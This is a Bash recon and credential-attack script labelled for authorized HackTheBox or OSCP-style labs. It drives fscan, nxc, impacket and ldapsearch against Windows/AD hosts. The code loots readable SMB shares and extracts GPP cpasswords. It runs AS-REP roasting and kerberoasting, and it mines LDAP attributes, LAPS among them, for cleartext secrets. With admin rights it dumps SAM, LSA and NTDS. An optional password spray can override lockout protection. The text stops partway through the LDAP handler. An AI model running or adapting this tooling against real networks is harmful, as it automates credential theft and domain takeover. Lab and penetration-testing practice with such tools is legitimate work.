#!/usr/bin/env bash
#
# enumerator.sh - fscan-driven recon aggregator for AUTHORIZED testing only
# (HackTheBox ProLabs / boxes, OSCP-style labs, engagements you are scoped for).
#
# Discovery engine: fscan (sole port+service engine; no nmap).
# Routing: PORT-NUMBER-FIRST (fscan's service labels are unreliable), so even
# when fscan mislabels a port the correct handler still runs.
#
# DO NOT run this script under proxychains. It wraps each libc tool per-call
# with `proxychains4 -q`; preloading the orchestrator causes stack-smash aborts.
# Use --pivot chisel / --proxy-addr to point at your SOCKS proxy instead.
#
set -o pipefail

# ───────────────────────── colours (real ESC so heredocs/printf render) ──────
ESC=$'\033'
RED="${ESC}[0;31m";   GREEN="${ESC}[0;32m"; YELLOW="${ESC}[1;33m"
BLUE="${ESC}[0;34m";  CYAN="${ESC}[0;36m";  MAGENTA="${ESC}[0;35m"
BOLD="${ESC}[1m";     RESET="${ESC}[0m"

# ───────────────────────── printers ──────────────────────────────────────────
ok()    { echo -e "${GREEN}[+] $1${RESET}"; }
warn()  { echo -e "${YELLOW}[!] $1${RESET}"; }
info()  { echo -e "${YELLOW}[*] $1${RESET}"; }
vinfo() { [[ "${VERBOSE:-0}" -eq 1 ]] && echo -e "${YELLOW}[*] $1${RESET}"; return 0; }
err()   { echo -e "${RED}[-] $1${RESET}"; }
have()  { command -v "$1" &>/dev/null; }
need()  { have "$1" || { [[ "${VERBOSE:-0}" -eq 1 ]] && info "Tool '$1' not found - skipping ${2:-this step}"; return 1; }; }

# strip fscan colour codes + carriage-return progress bars that glue lines
strip_noise() { tr '\r' '\n' | sed "s/${ESC}\[[0-9;]*[A-Za-z]//g"; }

# ───────────────────────── usage ─────────────────────────────────────────────
usage() {
cat <<USAGE
${BOLD}enumerator.sh${RESET} - fscan-driven recon for AUTHORIZED testing only

USAGE:
  ./enumerator.sh --unauth <ip> [options]
  ./enumerator.sh --auth   <ip> -u <user> -p <pass> -d <domain> [options]

TARGET / MODE:
   --unauth <ip>   Unauthenticated sweep (no creds).
   --auth   <ip>   Authenticated sweep (requires -u and one of -p/-H).

CREDENTIALS:
   -u <user>       Username.
   -p <pass>       Cleartext password.
   -H <nthash>     NT hash (pass-the-hash) instead of -p.
   -d <domain>     AD domain (e.g. support.htb). Needed for LDAP/Kerberos.
   -k              Use Kerberos auth (-k) for impacket/nxc.
   --local         Local auth (--local-auth) instead of domain.

PIVOT / PROXY (do NOT launch this script under proxychains):
   --pivot chisel        Mark that traffic egresses a SOCKS proxy.
   --proxy-addr <url>    SOCKS proxy, e.g. socks5://127.0.0.1:1080
                         Feeds fscan + Go/Rust web tools natively; libc tools
                         are wrapped with 'proxychains4 -q' per call.

SCOPE / OUTPUT:
   --aggressive    Enable disruptive checks (zerologon/nopac/petitpotam,
                   Coercer scan, password spray, and cred spray).
   --no-web-brute  Skip web content discovery (ffuf/feroxbuster).
   --no-loot-shares  Do NOT auto-download readable SMB shares (auth mode).
   --no-loot-ftp   Do NOT auto-download anonymous FTP contents.
   --services <list>  Only run these service handlers (comma list, e.g.
                   'smb,ldap,kerberos'; use 'web' for http). Default: all.
   --no-web        Skip the HTTP/web handler entirely.
   --no-bloodhound Skip BloodHound collection + analysis (auth mode).
   --no-flags      Box-build mode: do NOT hunt for user.txt/root.txt.
   --no-web-fuzz   Skip ffuf dir/vhost/parameter fuzzing.
   --web-vulns     OWASP-style web testing (nikto, nuclei vuln tags, TLS via
                   testssl/sslscan, LFI probe; sqlmap when --aggressive).
   --web-wordlist <f>   Directory/file list (default: seclists raft-medium).
   --vhost-wordlist <f> Subdomain/vhost list (default: seclists top-5000).
   --param-wordlist <f> GET/POST parameter list (default: burp-parameter-names).
   --login-path <p>     Login endpoint for auth brute (e.g. /login.php).
   --login-userlist <f> / --login-passlist <f>  Lists for the login brute.
   --login-failstr <s>  Response text that marks a failed login.
   --spray-wordlist <f>  Password-spray list (default: seclists top-1000).
   --crack-wordlist <f>  Hash-crack list (default: rockyou).
   --crack-timeout <s>   Max seconds per crack job (default: 600).
   --spray-force   Spray the full wordlist even if a lockout policy exists
                   (DANGEROUS - can lock out accounts). Off by default.
   --verbose, -v   Stream full tool output to the terminal. Default is
                   compact: only headers, leads and findings on screen;
                   full output is written to services/*.txt.
   --usage         Show this help.

EXAMPLES:
  ./enumerator.sh --unauth 10.10.10.10
  ./enumerator.sh --auth 10.129.20.222 -u ldap -p 'P@ss' -d support.htb --aggressive
  ./enumerator.sh --unauth 172.16.1.20 --pivot chisel --proxy-addr socks5://127.0.0.1:1080
USAGE
}

# ───────────────────────── defaults / globals ────────────────────────────────
MODE=""; IP=""; USER=""; PASS=""; HASH=""; DOMAIN=""; KERB=0; LOCAL_AUTH=0
AGGRESSIVE=0; WEB_BRUTE=1; PIVOT="none"; PROXY_ADDR=""; VERBOSE=0
DOWNLOAD_SHARES=1            # auto-download readable shares in auth mode
DOWNLOAD_FTP=1              # auto-download anonymous FTP contents
ONLY_SVC=""                # comma list of services to run; empty = all
DO_WEB=1                   # run the HTTP/web handler
DO_BLOODHOUND=1            # collect + analyze BloodHound (auth mode)
DO_FLAGS=1                 # hunt for user.txt / root.txt (off = box-build mode)
WEB_FUZZ=1                 # ffuf dir/vhost/param fuzzing
DO_WEBVULNS=0             # OWASP-style web vuln testing (opt-in; nikto/sqlmap/testssl/...)
WEB_WORDLIST=""           # override web content-discovery wordlist
VHOST_WORDLIST=""         # override subdomain/vhost wordlist
PARAM_WORDLIST=""         # override GET/POST parameter wordlist
LOGIN_PATH=""             # login endpoint path for auth brute (e.g. /login.php)
LOGIN_USERLIST=""         # username list for login brute
LOGIN_PASSLIST=""         # password list for login brute
LOGIN_FAILSTR=""          # response substring that marks a failed login
SPRAY_WORDLIST=""           # override password-spray wordlist (default: seclists top-1000)
CRACK_WORDLIST=""           # override hash-crack wordlist (default: rockyou)
SPRAY_FORCE=0               # bypass lockout-threshold protection on the spray
CRACK_TIMEOUT=600           # max seconds per hash-crack job

CREDS_VALID=0      # set when nxc confirms supplied creds are valid
LDAPDUMP_DONE=0    # guard: ldapsearch credential dump runs at most once/host
declare -A HANDLER_RAN   # guard: each service handler runs at most once

TMO_SHORT=60; TMO_MED=180; TMO_LONG=600   # per-tool timeouts (seconds)

# ───────────────────────── arg parsing ───────────────────────────────────────
[[ $# -eq 0 ]] && { usage; exit 0; }
# req <flag> ensures the next token exists; prevents 'shift 2' on a lone trailing
# flag from looping forever (shift 2 is atomic and shifts nothing when $#<2).
req() { [[ $# -ge 2 ]] || { err "$1 requires a value."; exit 1; }; }
while [[ $# -gt 0 ]]; do
    case "$1" in
        --unauth) req "$@"; MODE="unauth"; IP="$2"; shift 2;;
        --auth)   req "$@"; MODE="auth";   IP="$2"; shift 2;;
        -u) req "$@"; USER="$2"; shift 2;;
        -p) req "$@"; PASS="$2"; shift 2;;
        -H) req "$@"; HASH="$2"; shift 2;;
        -d) req "$@"; DOMAIN="$2"; shift 2;;
        -k) KERB=1; shift;;
        --local) LOCAL_AUTH=1; shift;;
        --pivot) req "$@"; PIVOT="$2"; shift 2;;
        --proxy-addr) req "$@"; PROXY_ADDR="$2"; shift 2;;
        --aggressive) AGGRESSIVE=1; shift;;
        --no-web-brute) WEB_BRUTE=0; shift;;
        --no-loot-shares) DOWNLOAD_SHARES=0; shift;;
        --no-loot-ftp) DOWNLOAD_FTP=0; shift;;
        --services|--only) req "$@"; ONLY_SVC="$2"; shift 2;;
        --all-services) ONLY_SVC=""; shift;;
        --no-web) DO_WEB=0; shift;;
        --no-bloodhound) DO_BLOODHOUND=0; shift;;
        --no-flags) DO_FLAGS=0; shift;;
        --no-web-fuzz) WEB_FUZZ=0; shift;;
        --web-vulns) DO_WEBVULNS=1; shift;;
        --web-wordlist) req "$@"; WEB_WORDLIST="$2"; shift 2;;
        --vhost-wordlist) req "$@"; VHOST_WORDLIST="$2"; shift 2;;
        --param-wordlist) req "$@"; PARAM_WORDLIST="$2"; shift 2;;
        --login-path) req "$@"; LOGIN_PATH="$2"; shift 2;;
        --login-userlist) req "$@"; LOGIN_USERLIST="$2"; shift 2;;
        --login-passlist) req "$@"; LOGIN_PASSLIST="$2"; shift 2;;
        --login-failstr) req "$@"; LOGIN_FAILSTR="$2"; shift 2;;
        --spray-wordlist) req "$@"; SPRAY_WORDLIST="$2"; shift 2;;
        --crack-wordlist) req "$@"; CRACK_WORDLIST="$2"; shift 2;;
        --crack-timeout) req "$@"; CRACK_TIMEOUT="$2"; shift 2;;
        --spray-force) SPRAY_FORCE=1; shift;;
        --verbose|-v) VERBOSE=1; shift;;
        --usage|-h|--help) usage; exit 0;;
        *) err "Unknown argument: $1"; echo "Run ./enumerator.sh --usage for help."; exit 1;;
    esac
done

[[ -z "$MODE" || -z "$IP" ]] && { err "Need --unauth <ip> or --auth <ip>."; exit 1; }
if [[ "$MODE" == "auth" ]]; then
    [[ -z "$USER" ]] && { err "--auth requires -u <user>."; exit 1; }
    [[ -z "$PASS" && -z "$HASH" ]] && { err "--auth requires -p <pass> or -H <hash>."; exit 1; }
fi

# refuse to run under proxychains (stack-smash guard)
if [[ -n "$LD_PRELOAD" ]] && echo "$LD_PRELOAD" | grep -qi 'proxychains'; then
    err "Do NOT run this script under proxychains."
    err "Launch it directly; use --pivot chisel / --proxy-addr for the SOCKS proxy."
    exit 1
fi

# ───────────────────────── proxy / SOCKS wiring ──────────────────────────────
PCQ=""; SOCKS=""
NSOCKS_FSCAN=""; NSOCKS_FFUF=""; NSOCKS_FEROX=""; NSOCKS_NUCLEI=""
if [[ "$PIVOT" == "chisel" || -n "$PROXY_ADDR" ]]; then
    addr="${PROXY_ADDR#*://}"
    SHOST="${addr%%:*}"; SPORT="${addr##*:}"
    [[ -z "$SHOST" || "$SHOST" == "$addr" ]] && SHOST="127.0.0.1"
    [[ -z "$SPORT" || "$SPORT" == "$addr" ]] && SPORT="1080"
    SOCKS="socks5://$SHOST:$SPORT"
    PCQ="proxychains4 -q"               # libc tools are hooked per-call
    NSOCKS_FSCAN="-proxy socks5://$SHOST:$SPORT"
    NSOCKS_FFUF="-x socks5://$SHOST:$SPORT"
    NSOCKS_FEROX="-p socks5://$SHOST:$SPORT"
    NSOCKS_NUCLEI="-proxy socks5://$SHOST:$SPORT"
fi

# ───────────────────────── output dirs ───────────────────────────────────────
STAMP="$(date +%Y%m%d_%H%M%S)"
OUTDIR="$(pwd)/enum_${IP}_${STAMP}"
SCANS="$OUTDIR/scans"; SVCDIR="$OUTDIR/services"; LOOT="$OUTDIR/loot"
SUMMARY="$OUTDIR/_SUMMARY.txt"; LEADS="$OUTDIR/_leads.tmp"; CMDLOG="$OUTDIR/_commands.log"
mkdir -p "$SCANS" "$SVCDIR" "$LOOT"
: > "$LEADS"; : > "$CMDLOG"
CUR_OUT="$SCANS/_misc.txt"; OPEN_PORTS=""

# ───────────────────────── execution helpers ─────────────────────────────────
# runc <timeout> "<cmd string>"  - run a tool; compact=file only, verbose=stream
runc() {
    local tmo="$1"; shift
    echo "\$ $*" >> "$CMDLOG"
    echo "\$ $*" >> "$CUR_OUT"
    if [[ "${VERBOSE:-0}" -eq 1 ]]; then
        timeout -k 10 "$tmo" bash -c "$*" </dev/null 2>&1 | tee -a "$CUR_OUT"
    else
        timeout -k 10 "$tmo" bash -c "$*" </dev/null >> "$CUR_OUT" 2>&1
    fi
    echo "" >> "$CUR_OUT"
}

# capc <timeout> "<cmd string>"  - capture output to a variable AND the file
# (terminal-silent: used when we need to branch on a tool's output)
capc() {
    local tmo="$1"; shift
    echo "\$ $*" >> "$CMDLOG"
    local o
    o=$(timeout -k 10 "$tmo" bash -c "$*" </dev/null 2>&1 | tr -d '\0')
    printf '%s\n' "$o" >> "$CUR_OUT"
    printf '%s' "$o"
}

# setout <slug> <header> - point CUR_OUT at services/<slug>.txt and print header
setout() {
    CUR_OUT="$SVCDIR/$1.txt"; : >> "$CUR_OUT"
    echo; echo -e "${CYAN}${BOLD}--- $2 ---${RESET}"
}

# add_lead <lead> [next-step] - always shown on screen + recorded for summary
add_lead() {
    echo -e "${GREEN}${BOLD}  LEAD:${RESET} $1"
    printf '%s\n' "$1" >> "$LEADS"
    [[ -n "$2" ]] && printf '        -> %s\n' "$2" >> "$LEADS"
}

# flag_auth_error <captured-output> <label> - surface a silent auth/tool failure
# even in compact mode (otherwise a failed step looks identical to "found nothing")
flag_auth_error() {  # $1=output  $2=label  $3=optional benign-regex (suppresses warn)
    [[ -n "$3" ]] && echo "$1" | grep -qiE "$3" && return 0   # benign empty result, not a failure
    echo "$1" | grep -qiE 'STATUS_LOGON_FAILURE|invalidCredentials|KDC_ERR_PREAUTH_FAILED|KDC_ERR_CLIENT_REVOKED|wrong password|authentication failed|password.*expired|account.*(locked|disabled)' \
        && warn "$2: tool reported an authentication failure - check services/ for detail"
    return 0
}

# ───────────────────────── auth fragment builders ────────────────────────────
# nxc auth args, each value single-quoted so special chars (^ $ %) survive bash -c
nxc_auth() {
    local a=""
    [[ -n "$USER" ]] && a="-u '$USER'"
    if [[ -n "$HASH" ]]; then a="$a -H '$HASH'"; elif [[ -n "$PASS" ]]; then a="$a -p '$PASS'"; fi
    [[ -n "$DOMAIN" && "$LOCAL_AUTH" -eq 0 ]] && a="$a -d '$DOMAIN'"
    [[ "$LOCAL_AUTH" -eq 1 ]] && a="$a --local-auth"
    [[ "$KERB" -eq 1 ]] && a="$a -k"
    printf '%s' "$a"
}

# impacket target, returned SINGLE-QUOTED so bash -c does NOT re-expand $ in the
# password. THIS is the fix for the old 'invalidCredentials' kerberoast bug:
# an unquoted domain/user:pass@host let bash -c expand $e7/$tRWx/$lmz to empty.
imp_target() {
    if [[ -n "$HASH" && -z "$PASS" ]]; then
        printf "'%s/%s@%s'" "$DOMAIN" "$USER" "$IP"
    else
        printf "'%s/%s:%s@%s'" "$DOMAIN" "$USER" "$PASS" "$IP"
    fi
}
# Credential-only identity (NO @host) for tools that parse with parse_credentials
# (GetUserSPNs.py / GetNPUsers.py) and take the DC via -dc-ip. Appending @host
# here corrupts the password (it gets swallowed -> invalidCredentials / data 52e).
imp_creds() {
    if [[ -n "$HASH" && -z "$PASS" ]]; then
        printf "'%s/%s'" "$DOMAIN" "$USER"
    else
        printf "'%s/%s:%s'" "$DOMAIN" "$USER" "$PASS"
    fi
}
imp_extra() {
    local e=""
    [[ -n "$HASH" ]] && e="-hashes :$HASH"
    [[ "$KERB" -eq 1 ]] && e="$e -k"
    printf '%s' "$e"
}
# base DN from domain: support.htb -> DC=support,DC=htb
base_dn() { printf 'DC=%s' "$(printf '%s' "$DOMAIN" | sed 's/\./,DC=/g')"; }

# ───────────────────────── progress bar + heartbeat ──────────────────────────
PHASES_TOTAL=4
progress() {  # progress <phase-number>
    local p="$1" width=40 filled
    filled=$(( p * width / PHASES_TOTAL ))
    local bar; bar="$(printf '%*s' "$filled" '' | tr ' ' '#')$(printf '%*s' "$((width-filled))" '' | tr ' ' '.')"
    echo; echo -e "  ${BOLD}[${bar}] $(( p*100/PHASES_TOTAL ))%  (phase ${p}/${PHASES_TOTAL})${RESET}"
}

HEARTBEAT_PID=""
_start_heartbeat() {  # _start_heartbeat "<label>"
    local label="$1" parent=$$ start; start=$(date +%s)
    ( while :; do
        sleep 60
        kill -0 "$parent" 2>/dev/null || exit 0   # parent gone -> self-terminate
        printf "${YELLOW}      [*] %s still working… %ds elapsed${RESET}\n" "$label" "$(( $(date +%s) - start ))"
      done ) &
    HEARTBEAT_PID=$!
}
_stop_heartbeat() { [[ -n "$HEARTBEAT_PID" ]] && kill "$HEARTBEAT_PID" 2>/dev/null; HEARTBEAT_PID=""; }
trap '_stop_heartbeat' EXIT INT TERM HUP

phase() {  # phase <num> "<TITLE>"
    progress "$1"
    echo -e "${BOLD}==================== PHASE $1: $2 ====================${RESET}"
}

# ───────────────────────── banner ────────────────────────────────────────────
art_banner() {
    printf '%b' "${CYAN}${BOLD}"
    cat <<'BANNER'

   ___ _  _ _   _ __  __ ___ ___    _ _____ ___  ___
  | __| \| | | | |  \/  | __| _ \  /_\_   _/ _ \| _ \
  | _|| .` | |_| | |\/| | _||   / / _ \| || (_) |   /
  |___|_|\_|\___/|_|  |_|___|_|_\/_/ \_\_| \___/|_|_\
BANNER
    printf '%b\n' "${RESET}${BOLD}        fscan-driven recon  ·  authorized testing only${RESET}"
}

# ════════════════════════════════════════════════════════════════════════════
#  LDAP credential-field extraction (shared by ldapsearch dump + nxc desc)
#  AD fields where cleartext creds get stashed: description, info ("Notes" in
#  ADUC), comment(s), userPassword, unixUserPassword, gecos, and the LAPS
#  attribute ms-Mcs-AdmPwd. ldapsearch emits LDIF ("attr: value" blocks, blank-
#  line separated); non-ASCII values come back base64 as "attr:: <b64>".
# ════════════════════════════════════════════════════════════════════════════
# exact built-in descriptions to suppress so genuine finds stand out
is_boilerplate_desc() {
    case "$1" in
        "Built-in account for administering the computer/domain") return 0;;
        "Built-in account for guest access to the computer/domain") return 0;;
        "Key Distribution Center Service Account") return 0;;
        "Built-in account for anonymous access to Internet Information Services") return 0;;
        "A user account managed by the system.") return 0;;
        *) return 1;;
    esac
}

# awk: emit  user \t attr \t sep(":"|"::") \t value   for credential-bearing attrs
extract_secret_raw() {   # $1 = LDIF dump file
    awk '
    BEGIN{ IGNORECASE=1 }
    function flush(   i,user,line,attr,rest,sep,val){
        if(nlines>0){
            user=""
            for(i=1;i<=nlines;i++) if(buf[i] ~ /^sAMAccountName:/){ user=buf[i]; sub(/^sAMAccountName::?[ \t]*/,"",user); break }
            if(user=="") for(i=1;i<=nlines;i++) if(buf[i] ~ /^cn:/){ user=buf[i]; sub(/^cn::?[ \t]*/,"",user); break }
            for(i=1;i<=nlines;i++){
                if(buf[i] ~ /^(description|info|comment|comments|userPassword|unixUserPassword|ms-Mcs-AdmPwd|gecos):/){
                    line=buf[i]
                    attr=line; sub(/:.*/,"",attr)
                    rest=substr(line, length(attr)+1)
                    if(rest ~ /^:: /){ sep="::"; val=substr(rest,4) }
                    else if(rest ~ /^: /){ sep=":"; val=substr(rest,3) }
                    else continue
                    if(val=="") continue
                    printf "%s\t%s\t%s\t%s\n", (user==""?"?":user), attr, sep, val
                }
            }
        }
        nlines=0
    }
    /^[[:space:]]*$/ { flush(); next }
    { buf[++nlines]=$0 }
    END{ flush() }
    ' "$1"
}

# decode base64 (sep ::), drop boilerplate descriptions, pretty-print.
# also appends cleartext candidate secrets to $1.secrets for the optional spray.
process_secret_fields() {   # $1 = LDIF dump file ; prints formatted lines
    local user attr sep val dec shown lc
    : > "${1}.secrets"
    extract_secret_raw "$1" | while IFS=$'\t' read -r user attr sep val; do
        lc="${attr,,}"
        if [[ "$lc" == "description" ]] && is_boilerplate_desc "$val"; then continue; fi
        shown="$val"
        if [[ "$sep" == "::" ]]; then
            dec=$(printf '%s' "$val" | base64 -d 2>/dev/null | tr -d '\0' | tr -cd '[:print:]')
            if [[ -n "$dec" ]]; then shown="$val   [b64-decoded: $dec]"; printf '%s\n' "$dec" >> "${1}.secrets"; fi
        else
            printf '%s\n' "$val" >> "${1}.secrets"
        fi
        printf '%-22s %s: %s\n' "$user" "$attr" "$shown"
    done
}

# ════════════════════════════════════════════════════════════════════════════
#  PHASE 1 - fscan discovery (sole engine; no nmap)
# ════════════════════════════════════════════════════════════════════════════
discover_ports() {
    vinfo "fscan (SOCKS-native, connect-based; brute/POC disabled)"
    [[ -n "$SOCKS" ]] && vinfo "fscan SOCKS5 -> $SOCKS"
    need fscan "port discovery" || { err "fscan is required. Install it and re-run."; exit 1; }
    echo "\$ fscan -h $IP -p 1-65535 -np -nobr -nopoc -lang en $NSOCKS_FSCAN -o $SCANS/fscan.txt" >> "$CMDLOG"
    # fscan is a static Go binary -> native SOCKS, never proxychains. Strip any
    # inherited LD_PRELOAD just in case.
    if [[ "$VERBOSE" -eq 1 ]]; then
        timeout -k 10 "$TMO_LONG" env -u LD_PRELOAD fscan -h "$IP" -p 1-65535 \
            -np -nobr -nopoc -lang en $NSOCKS_FSCAN -o "$SCANS/fscan.txt" 2>&1 \
            | tee "$SCANS/fscan.console"
    else
        info "Scanning all 65535 TCP ports (output -> scans/) ..."
        timeout -k 10 "$TMO_LONG" env -u LD_PRELOAD fscan -h "$IP" -p 1-65535 \
            -np -nobr -nopoc -lang en $NSOCKS_FSCAN -o "$SCANS/fscan.txt" > "$SCANS/fscan.console" 2>&1
    fi
    # normalise both outputs (kill colour + CR progress bars)
    strip_noise < "$SCANS/fscan.console" > "$SCANS/fscan.clean" 2>/dev/null
    [[ -f "$SCANS/fscan.txt" ]] && strip_noise < "$SCANS/fscan.txt" >> "$SCANS/fscan.clean"
    build_service_map
}

# build OPEN_PORTS + service_map.txt (port<TAB>label) + service_detail.txt +
# fscan_findings.txt.  Labels are cosmetic; routing is by port number.
build_service_map() {
    local clean="$SCANS/fscan.clean"
    : > "$SCANS/service_map.txt"; : > "$SCANS/service_detail.txt"; : > "$SCANS/fscan_findings.txt"

    # open ports: every IP:PORT seen in fscan output
    OPEN_PORTS=$(grep -aoE '[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]{1,5}' "$clean" 2>/dev/null \
                 | awk -F: '{print $2}' | sort -un | paste -sd, -)
    [[ -z "$OPEN_PORTS" ]] && OPEN_PORTS=$(grep -aoE ':[0-9]{1,5}\b' "$clean" 2>/dev/null \
                 | tr -d ':' | sort -un | paste -sd, -)

    # fscan [+] key findings (SMBInfo/RDP/LDAP/NetInfo/etc.); drop the NetInfo
    # line that just echoes the host's own IP ("-> 10.x.x.x") as noise.
    grep -aE '^\[\+\]' "$clean" 2>/dev/null \
        | grep -avE '\->[[:space:]]*'"$IP"'[[:space:]]*$' \
        | sort -u > "$SCANS/fscan_findings.txt"

    # per-port detail. fscan's service-detail lines carry a [Product:...] tag;
    # anchor on it (robust) rather than trying to exclude every status line.
    local port line svc prod ctx
    for port in ${OPEN_PORTS//,/ }; do
        line=$(grep -aE ":${port}\b" "$clean" 2>/dev/null | grep -a '\[Product:' | head -n1)
        if [[ -n "$line" ]]; then
            # service token = the word immediately before [Product:
            svc=$(printf '%s'  "$line" | sed -nE 's/.*[: ]([A-Za-z0-9][A-Za-z0-9._-]*)[[:space:]]+\[Product:.*/\1/p' | head -n1)
            # product/version = the clean bracket contents
            prod=$(printf '%s' "$line" | sed -nE 's/.*\[Product:([^]]*)\].*/\1/p' | head -n1 | cut -c1-34)
        else
            svc=""; prod=""
        fi
        # context from [+] findings for this port (SMBInfo/LDAP/NetInfo/...)
        ctx=$(grep -aE ":${port}\b" "$SCANS/fscan_findings.txt" 2>/dev/null \
              | sed -E 's/\[\+\][[:space:]]*//; s/'"${IP}"':[0-9]+//g; s/[[:space:]]+/ /g; s/^ //; s/ $//' \
              | grep -avE '^[A-Za-z]+$' \
              | paste -sd'; ' - | cut -c1-80)
        printf '%s\t%s\n' "$port" "${svc:-unknown}" >> "$SCANS/service_map.txt"
        if [[ -n "$ctx" ]]; then
            printf '  %-6s %-13s %-30s | %s\n' "$port" "${svc:-unknown}" "${prod:-}" "$ctx" >> "$SCANS/service_detail.txt"
        else
            printf '  %-6s %-13s %s\n' "$port" "${svc:-unknown}" "${prod:-}" >> "$SCANS/service_detail.txt"
        fi
    done
    vinfo "Service map ($(wc -l < "$SCANS/service_map.txt") ports): $SCANS/service_map.txt"
    [[ -n "$OPEN_PORTS" ]] && ok "Open TCP ports: $OPEN_PORTS"
}

# ───────────────────────── port -> handler routing ───────────────────────────
route_handler() {  # echo handler function name for a port (empty if none)
    case "$1" in
        21) echo h_ftp;;
        22) echo h_ssh;;
        23) echo h_telnet;;
        25|465|587) echo h_smtp;;
        53) echo h_dns;;
        88) echo h_kerberos;;
        80|443|8000|8080|8443|8888) echo h_http;;
        110|995) echo h_pop3;;
        111|2049) echo h_nfs;;
        135|593) echo h_msrpc;;
        139|445) echo h_smb;;
        143|993) echo h_imap;;
        161) echo h_snmp;;
        389|636|3268|3269) echo h_ldap;;
        1433) echo h_mssql;;
        3306) echo h_mysql;;
        3389) echo h_rdp;;
        5985|5986) echo h_winrm;;
        6379) echo h_redis;;
        *) echo "";;
    esac
}

# Decide whether a service handler should run, given --services / --no-web.
_want_svc() {  # $1 = service short name (smb/ldap/http/ftp/...)
    local n="$1" want
    [[ "$n" == "http" && "$DO_WEB" -eq 0 ]] && return 1
    [[ -z "$ONLY_SVC" ]] && return 0
    for want in ${ONLY_SVC//,/ }; do
        [[ "$want" == "$n" ]] && return 0
        [[ "$want" == "web"  && "$n" == "http" ]] && return 0
    done
    return 1
}

# ════════════════════════════════════════════════════════════════════════════
#  SERVICE HANDLERS
# ════════════════════════════════════════════════════════════════════════════

# ── SMB (139/445) ────────────────────────────────────────────────────────────
h_smb() {
    local A out
    setout smb "SMB ($1)"
    # ---- unauthenticated ----
    runc "$TMO_MED" "$PCQ nxc smb $IP 2>&1"                           # host/domain/signing
    runc "$TMO_MED" "$PCQ nxc smb $IP -u '' -p '' --shares 2>&1"      # null session
    out=$(capc "$TMO_MED" "$PCQ nxc smb $IP -u guest -p '' --shares 2>&1")
    echo "$out" | grep -qiE 'READ|WRITE' && add_lead "[!] Guest/null SMB shares accessible ($IP)" "nxc smb $IP -u guest -p '' --shares ; review readable shares below"
    if have enum4linux-ng; then runc "$TMO_MED" "$PCQ enum4linux-ng -A $IP 2>&1"
    elif have enum4linux; then runc "$TMO_MED" "$PCQ enum4linux -a $IP 2>&1"; fi
    if need smbclient "anonymous share listing"; then
        runc "$TMO_SHORT" "$PCQ smbclient -N -L //$IP 2>&1"
    fi

    # ---- authenticated ----
    [[ "$MODE" != "auth" ]] && return 0
    A=$(nxc_auth)
    setout smb_auth "SMB (authenticated)"
    out=$(capc "$TMO_MED" "$PCQ nxc smb $IP $A --shares 2>&1")
    printf '%s\n' "$out" >> "$CUR_OUT"
    if echo "$out" | grep -qiE '\[\+\]'; then
        CREDS_VALID=1
        # readable/writable non-default shares -> point them out explicitly.
        # nxc cols: SMB IP PORT HOST SHARE PERM REMARK -> share is $5, perm $6.
        local rd rd_all
        rd_all=$(echo "$out" | awk '$1=="SMB" && ($6 ~ /READ/ || $6 ~ /WRITE/){print $5}' | sort -u)
        rd=$(echo "$rd_all" | grep -aviE '^(IPC\$|print\$|NETLOGON|SYSVOL|ADMIN\$|C\$)$' | paste -sd', ' -)
        [[ -z "$rd" ]] && rd=$(echo "$rd_all" | paste -sd', ' -)   # fall back to all if only defaults
        [[ -n "$rd" ]] && add_lead "[+] Readable/writable SMB shares ($IP): $rd" "Auto-downloaded to loot/shares/; grep for creds/configs"
        echo "$out" | grep -qiE 'Pwn3d' && add_lead "[!] SMB admin (Pwn3d!) on $IP" "nxc smb $IP $A --sam --lsa ; or psexec/wmiexec for a shell"
    fi
    # download every readable/writable share to loot/shares/ (reuses --shares output)
    download_shares "$out"
    runc "$TMO_MED"  "$PCQ nxc smb $IP $A --users --groups --loggedon-users --rid-brute 2>&1"
    # spider every readable share to a JSON inventory (finds foothold files)
    if need nxc "share spidering"; then
        runc "$TMO_LONG" "$PCQ nxc smb $IP $A -M spider_plus 2>&1"
        add_lead "[*] SMB shares spidered ($IP)" "Review ~/.nxc/modules/nxc_spider_plus/$IP.json for .config/.xml/.ps1/.exe/.zip with creds"
    fi
    # SYSVOL / GPP cached credentials (classic instant win)
    out=$(capc "$TMO_MED" "$PCQ nxc smb $IP $A -M gpp_password 2>&1; $PCQ nxc smb $IP $A -M gpp_autologin 2>&1")
    echo "$out" | grep -qiE 'cpassword|Found|Password' && add_lead "[!] GPP/SYSVOL cached password on $IP" "Decode the cpassword (gpp-decrypt) - usually a valid domain credential"
    # dump secrets if we already own the box
    if echo "$(capc "$TMO_SHORT" "$PCQ nxc smb $IP $A 2>&1")" | grep -qiE 'Pwn3d'; then
        runc "$TMO_MED" "$PCQ nxc smb $IP $A --sam --lsa 2>&1"
        [[ "$AGGRESSIVE" -eq 1 ]] && runc "$TMO_LONG" "$PCQ nxc smb $IP $A --ntds 2>&1 | tee $LOOT/ntds_$IP.txt"
    fi
}

# ── LDAP (389/636/3268/3269) ─────────────────────────────────────────────────
h_ldap() {
    local A out base; base="$(base_dn)"
    setout ldap "LDAP ($1)"
    # ---- unauthenticated ----
    if need ldapsearch "anonymous LDAP"; then
        out=$(capc "$TMO_SHORT" "$PCQ ldapsearch -x -H ldap://$IP -s base namingContexts 2>&1")
        echo "$out" | grep -qiE 'namingContexts|dc=' && add_lead "[!] Anonymous LDAP bind allowed ($IP)" "nxc ldap $IP -u '' -p '' --users ; ldapsearch -x -H ldap://$IP -b '$base'"
    fi
    runc "$TMO_MED" "$PCQ nxc ldap $IP -u '' -p '' --users 2>&1"

    # ---- authenticated ----
    [[ "$MODE" != "auth" ]] && return 0
    A=$(nxc_auth)
    setout ldap_auth "LDAP (authenticated)"
    out=$(capc "$TMO_MED" "$PCQ nxc ldap $IP $A --users --groups --pass-pol 2>&1")
    printf '%s\n' "$out" >> "$CUR_OUT"
    echo "$out" | grep -qiE '\[\+\]' && CREDS_VALID=1
    flag_auth_error "$out" "LDAP auth"

    # AS-REP-roastable + kerberoastable via nxc (impacket equivalents run in h_kerberos)
    runc "$TMO_MED" "$PCQ nxc ldap $IP $A --asreproast $LOOT/asrep_$IP.txt 2>&1"
    runc "$TMO_MED" "$PCQ nxc ldap $IP $A --kerberoasting $LOOT/kerb_$IP.txt 2>&1"
    [[ -s "$LOOT/asrep_$IP.txt" ]] && add_lead "[!] AS-REP roastable users ($IP)" "hashcat -m 18200 $LOOT/asrep_$IP.txt"
    [[ -s "$LOOT/kerb_$IP.txt" ]]  && add_lead "[!] Kerberoastable SPNs ($IP)"   "hashcat -m 13100 $LOOT/kerb_$IP.txt"
